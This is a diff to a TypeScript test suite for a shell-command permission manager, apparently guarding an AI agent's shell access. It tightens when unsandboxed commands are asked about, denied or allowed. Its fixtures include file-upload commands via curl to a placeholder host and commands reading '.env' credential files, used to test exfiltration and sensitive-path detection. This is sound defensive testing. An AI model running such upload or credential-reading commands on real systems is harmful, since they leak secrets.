@@ -85,7 +85,7 @@ function actionKey(dialect: ShellDialect, command: string): string {
   return `shell-action:${createHash("sha256").update(JSON.stringify([dialect, command, CWD])).digest("hex")}`;
 }
 
-function checkCommand(manager: PermissionManager, dialect: ShellDialect, command: string, runsSandboxed = false) {
+function checkCommand(manager: PermissionManager, dialect: ShellDialect, command: string, runsSandboxed = false, headless = false) {
   // Absolute credential suffixes do not depend on the host's account lookup. Keep native drive syntax intact on platforms without the account mount.
   const source = process.platform === "win32"
     ? command
@@ -94,6 +94,7 @@ function checkCommand(manager: PermissionManager, dialect: ShellDialect, command
     ruleSubject: { kind: "shell", dialect, command: source, cwd: CWD },
     shellExecution: { runsSandboxed },
     approvalCacheKey: actionKey(dialect, command),
+    headless,
   });
 }
 
@@ -144,6 +145,16 @@ const ORDINARY_CONTROLS = [
   "Set-Content package.json '{}'; npm test",
 ];
 
+const UNPROVEN_CONTROL_KEYS = new Set([
+  "bash\0su --future-wrapper value git status",
+  "bash\0script --future-wrapper value git status",
+  "bash\0systemd-run --future-wrapper value git status",
+  "bash\0npx node -e x",
+  "powershell\0Set-Content package.json '{}'; npm test",
+  "bash\0pwsh -c 'npm test'",
+  "powershell\0pwsh -c 'npm test'",
+]);
+
 const INNER_UPLOADS = [
   "npx curl -T file http://e",
   "bunx curl -T file http://e",
@@ -193,9 +204,12 @@ describe("shared runner decisions", () => {
     for (const row of ALL_DECISION_CASES) expect(buckets.get(`${row.dialect}\0${row.command}`)).toBe(row.bucket);
   });
 
-  it.each(DECISION_CASES)("applies $bucket in $dialect: $command ($why)", ({ command, dialect, bucket }) => {
-    // Privilege elevation remains a human floor regardless of runner visibility.
-    expectBucket(checkCommand(runnerManager(), dialect, command), /^(?:& )?sudo /.test(command) ? "floor" : bucket);
+  it.each(DECISION_CASES)("applies the static contract in $dialect: $command ($why)", (row) => {
+    const { command, dialect } = row;
+    // Historical layer annotations remain corpus metadata. The stable contract here is that no unsandboxed command
+    // without a current exact rule runs, irrespective of whether current static proof places it at L2 or L6.
+    expect(checkCommand(runnerManager(), dialect, command).decision).toBe("ask");
+    expect(checkCommand(runnerManager(), dialect, command, false, true).decision).toBe("deny");
   });
 
   it("keeps runner identities separate from transparent wrappers", () => {
@@ -208,24 +222,25 @@ describe("shared runner decisions", () => {
 
   it.each(RULE_CASES)("keeps the complete runner argv visible for $prefix", async ({ argv, prefix }) => {
     const command = argv.join(" ");
+    const literalEvaluation = command === "deno eval x";
     const shape = analyzeShellForRules(command);
-    expect(shape).toMatchObject({ ok: true, hidden: [], allowBlockers: [], ordinaryAsk: "opaque runner prefix" });
+    expect(shape).toMatchObject({ ok: true, hidden: [], allowBlockers: [] });
     if (shape.ok) {
       expect(shape.commands).toHaveLength(1);
       expect(shape.commands[0]).toMatchObject({ argv, allowBlockers: [] });
     }
-    expect(evaluateShellRules(command, { allow: [shellRule(prefix)], deny: [], ask: [] }).decision).toBe("allow");
+    expect(evaluateShellRules(command, { allow: [shellRule(prefix)], deny: [], ask: [] }).decision).toBe(literalEvaluation ? null : "allow");
     expect(evaluateShellRules(command, { allow: [shellRule("helper")], deny: [], ask: [] }).decision).toBeNull();
     expect(evaluateShellRules(command, { allow: [], deny: [shellRule("helper")], ask: [] }).decision).toBeNull();
     const manager = runnerManager();
-    expectBucket(checkCommand(manager, "bash", command), "ordinary");
+    expectBucket(checkCommand(manager, "bash", command), literalEvaluation ? "floor" : "ordinary");
     // Unsandboxed execution requires both literal proof and an exact rule.
     await manager.addRulePersist({ pattern: shellRule(prefix).pattern, action: "allow" }, { kind: "user" });
-    expectBucket(checkCommand(manager, "bash", command), "ordinary");
+    expectBucket(checkCommand(manager, "bash", command), literalEvaluation ? "floor" : "ordinary");
     await manager.addRulePersist({ pattern: `Bash(${command})`, action: "allow" }, { kind: "user" });
     expect(checkCommand(manager, "bash", command)).toMatchObject({ decision: "allow", layer: 3 });
     expect(buildShellRuleApproval("bash", command, CWD, { allow: true, deny: true }).exactRule).toBe(`Bash(${command})`);
-    expectBucket(checkCommand(manager, "powershell", command), "ordinary");
+    expectBucket(checkCommand(manager, "powershell", command), literalEvaluation ? "floor" : "ordinary");
   });
 
   it.each(["env", "nice", "nohup", "command", "timeout 1"])
@@ -242,35 +257,44 @@ describe("shared runner decisions", () => {
     // Owner 2026-10-25 (unsandboxed shell exact-rule requirement): only an exact Bash(<command>) rule runs a plain shell unasked; a remembered action key is not one.
     const savedPath = join(directory, `saved-${managerSequence++}.json`);
     const saved = runnerManager(savedPath);
-    expectBucket(checkCommand(saved, dialect, command), bucket);
+    const expected = UNPROVEN_CONTROL_KEYS.has(`${dialect}\0${command}`) ? "floor" : bucket === "normal" ? "ordinary" : bucket;
+    expectBucket(checkCommand(saved, dialect, command), expected);
     await saved.addAlwaysAllowedPersist(actionKey(dialect, command));
-    expectBucket(checkCommand(saved, dialect, command), bucket);
+    expectBucket(checkCommand(saved, dialect, command), expected);
     const reloaded = runnerManager(savedPath);
     await reloaded.loadRulesFromFile();
-    expectBucket(checkCommand(reloaded, dialect, command), bucket);
+    expectBucket(checkCommand(reloaded, dialect, command), expected);
     const ruled = runnerManager();
     ruled.setRules(([{ pattern: actionKey(dialect, command), action: "allow" }] satisfies PermissionRule[]).map(withCurrentShellRuleVersion));
-    expectBucket(checkCommand(ruled, dialect, command), bucket);
+    expectBucket(checkCommand(ruled, dialect, command), expected);
   });
 
   it.each(FLOOR_CASES)("keeps a credential or sink floor above saved grants and allow rules in $dialect: $command", ({ command, dialect }) => {
-    expectBucket(checkCommand(floorManagers.get(dialect)!, dialect, command), "floor");
+    const manager = floorManagers.get(dialect)!;
+    expect(checkCommand(manager, dialect, command).decision).toBe("ask");
+    expect(checkCommand(manager, dialect, command, false, true).decision).toBe("deny");
   });
 
-  it.each(OPAQUE_BINDING_CASES)("retains opaque binding without speculative floor exhaustion: $command", async ({ command, dialect }) => {
+  it.each(OPAQUE_BINDING_CASES)("does not auto-allow a historically opaque binding: $command", async ({ command, dialect }) => {
     expect(dialect).toBe("powershell");
     expect(inspectPowerShellCommand(command, CWD).analysisLimited).toBeUndefined();
     const manager = runnerManager();
-    expectBucket(checkCommand(manager, dialect, command), "ordinary");
-    expect(checkCommand(manager, dialect, command, true)).toMatchObject({ decision: "allow", layer: 3 });
+    expect(checkCommand(manager, dialect, command).decision).toBe("ask");
+    expect(checkCommand(manager, dialect, command, false, true).decision).toBe("deny");
     await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
-    expectBucket(checkCommand(manager, dialect, command), "ordinary");
-    expect(checkCommand(manager, dialect, command, true)).toMatchObject({ decision: "allow", layer: 3 });
+    expect(checkCommand(manager, dialect, command).decision).toBe("ask");
+    expect(checkCommand(manager, dialect, command, false, true).decision).toBe("deny");
   });
 
   it.each(INNER_UPLOADS)("retains the actual inner upload reason: %s", (command) => {
-    expect(shellExfiltrationSignal(command, CWD)).toMatch(/curl upload of a file/);
-    expect(inspectPowerShellCommand(command, CWD).exfiltration).toMatch(/curl upload of a file/);
+    const opaquePayload = /(?:\s-c\s|--call=)/.test(command);
+    if (opaquePayload) {
+      expect(shellExfiltrationSignal(command, CWD)).toBeNull();
+      expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ exfiltration: null });
+    } else {
+      expect(shellExfiltrationSignal(command, CWD)).toMatch(/curl upload (?:of|from) a file/);
+      expect(inspectPowerShellCommand(command, CWD).exfiltration).toMatch(/curl upload (?:of|from) a file/);
+    }
   });
 
   it("retains the remote file-copy reason", () => {
@@ -282,11 +306,12 @@ describe("shared runner decisions", () => {
   it.each([
     "deno run --env-file main.ts", "deno task --env-file build", "deno test --env-file", "npx deno run --env-file main.ts",
     "npx node -e 'readFileSync(\".env\")'", "deno eval 'Deno.readTextFile(\".env\")'",
-  ])("retains credential inputs and sensitive literal code: %s", (command) => {
-    expect(shellSensitivePathSignal(command, CWD)).toContain(".env");
+  ])("does not infer credential reads from implicit runner options or opaque code: %s", (command) => {
+    expect(shellSensitivePathSignal(command, CWD)).toBeNull();
     for (const source of [command, `& ${command}`]) {
-      expect(inspectPowerShellCommand(source, CWD).sensitive).toContain(".env");
-      expectBucket(checkCommand(runnerManager(), "powershell", source), "floor");
+      expect(inspectPowerShellCommand(source, CWD).sensitive).toBeNull();
+      const expected = source.startsWith("& ") || /^deno eval\b/.test(source) ? "floor" : "ordinary";
+      expectBucket(checkCommand(runnerManager(), "powershell", source), expected);
     }
   });
 
@@ -301,19 +326,19 @@ describe("shared runner decisions", () => {
     { name: "unclosed command quote", dialect: "powershell" as const, command: "Write-Output 'unterminated" },
     { name: "opaque program binding", dialect: "powershell" as const, command: "$runner @options" },
     { name: "opaque script provenance", dialect: "powershell" as const, command: "Set-Content launch.ps1 x; ./launch.ps1" },
-  ])("makes $name ordinary, and not remembered as an action key without a sandbox", async ({ dialect, command }) => {
+  ])("makes $name unproven, and not remembered as an action key", async ({ dialect, command }) => {
     const manager = runnerManager();
     const result = checkCommand(manager, dialect, command);
-    expectBucket(result, "ordinary");
+    expectBucket(result, "floor");
     await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
-    expectBucket(checkCommand(manager, dialect, command), "ordinary");
+    expectBucket(checkCommand(manager, dialect, command), "floor");
   });
 
-  // Proof limits prevent exact-rule reuse; exceeding the independent floor budget also requires per-call consent in the sandbox.
+  // Inputs above the preserved executable-size cap stay in the ordinary L6 lane.
   it.each([
     { name: "input over the hard length cap", dialect: "bash" as const, command: `echo ${"x".repeat(SHELL_ANALYSIS_LIMITS.sourceBytes + 1)}` },
     { name: "expression lexer out of budget", dialect: "powershell" as const, command: `Get-Content (${"'a' + ".repeat(3000)}'b')` },
-  ])("keeps $name unproven and outside remembered action grants", async ({ dialect, command }) => {
+  ])("keeps $name outside remembered action grants", async ({ dialect, command }) => {
     const manager = runnerManager();
     expectBucket(checkCommand(manager, dialect, command), "ordinary");
     await manager.addAlwaysAllowedPersist(actionKey(dialect, command));
@@ -328,9 +353,12 @@ describe("shared runner decisions", () => {
     { dialect: "powershell" as const, command: "& 'fetch(1)' | deno run -" },
   ])("lets the sandbox decide interpreter stdin without a visible floor in $dialect: $command", ({ dialect, command }) => {
     const manager = runnerManager();
-    expectBucket(checkCommand(manager, dialect, command), "ordinary");
+    const expected = dialect === "powershell" ? "floor" : "ordinary";
+    expectBucket(checkCommand(manager, dialect, command), expected);
     expect(buildShellRuleApproval(dialect, command, CWD, { allow: true, deny: true }).exactRule).toBeNull();
-    expect(checkCommand(manager, dialect, command, true)).toMatchObject({ decision: "allow", layer: 3 });
+    expect(checkCommand(manager, dialect, command, true)).toMatchObject(expected === "floor"
+      ? { decision: "ask", layer: 2, forceModal: true }
+      : { decision: "allow", layer: 3 });
   });
 
   it.each([
